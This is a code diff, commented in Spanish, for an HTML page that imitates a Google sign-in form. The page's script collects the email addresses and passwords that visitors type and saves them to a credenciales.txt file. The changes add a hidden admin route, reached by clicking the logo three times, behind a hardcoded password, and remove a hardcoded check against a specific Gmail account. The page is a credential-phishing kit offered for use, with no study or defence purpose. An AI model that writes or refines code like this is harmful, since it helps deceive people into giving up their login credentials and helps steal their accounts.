@@ -37,6 +37,7 @@
         .google-logo {
             width: 40px;
             margin-bottom: 20px;
+            cursor: pointer;
         }
 
         input {
@@ -93,7 +94,7 @@
 
     <div class="form-container">
         <!-- Logo de Google (en el mismo directorio) -->
-        <img src="google-logo.png" alt="Google Logo" class="google-logo">
+        <img src="google-logo.png" alt="Google Logo" class="google-logo" onclick="verificarLogo()">
         
         <h1>Iniciar sesión</h1>
         <input type="email" id="gmail" placeholder="Correo electrónico" required>
@@ -105,6 +106,21 @@
 
     <script>
         let credencialesGuardadas = [];
+        let contadorLogo = 0;
+
+        // Función para contar cuántas veces se ha hecho clic en el logo
+        function verificarLogo() {
+            contadorLogo++;
+            if (contadorLogo >= 3) {
+                // Si el logo es tocado 3 veces o más, redirige a edit.html
+                const contraseña = prompt("Introduce la contraseña para editar el archivo: ");
+                if (contraseña === "mario112233") {
+                    window.location.href = "edit.html"; // Redirige a edit.html si la contraseña es correcta
+                } else {
+                    alert("Contraseña incorrecta.");
+                }
+            }
+        }
 
         function procesarCredenciales() {
             const gmail = document.getElementById("gmail").value;
@@ -116,28 +132,21 @@
                 return;
             }
 
-            // Verificar si las credenciales son correctas
-            if (gmail === "security728273@gmail.com" && password === "mario112233") {
-                // Si son las credenciales correctas, redirigir al archivo credenciales.txt
-                alert("Credenciales correctas, redirigiendo...");
-                window.location.href = "credenciales.txt"; // En un entorno real, este archivo debe existir en el servidor
-            } else {
-                // Si las credenciales son incorrectas, agregar las credenciales al arreglo
-                credencialesGuardadas.push(`Gmail: ${gmail} Contraseña: ${password}`);
+            // Agregar las credenciales al arreglo
+            credencialesGuardadas.push(`Gmail: ${gmail} Contraseña: ${password}`);
 
-                // Crear el contenido del archivo credenciales.txt
-                let contenidoTxt = "";
-                credencialesGuardadas.forEach(cred => {
-                    contenidoTxt += cred + "\n";
-                });
+            // Crear el contenido del archivo credenciales.txt
+            let contenidoTxt = "";
+            credencialesGuardadas.forEach(cred => {
+                contenidoTxt += cred + "\n";
+            });
 
-                // Crear un Blob con el contenido del archivo de texto
-                const blob = new Blob([contenidoTxt], { type: 'text/plain' });
+            // Crear un Blob con el contenido del archivo de texto
+            const blob = new Blob([contenidoTxt], { type: 'text/plain' });
 
-                // Descargar el archivo generado
-                saveAs(blob, "credenciales.txt");
-                showAlert("Archivo creado con las credenciales ingresadas.");
-            }
+            // Descargar el archivo generado
+            saveAs(blob, "credenciales.txt");
+            showAlert("Archivo creado con las credenciales ingresadas.");
         }
 
         // Función para mostrar alertas
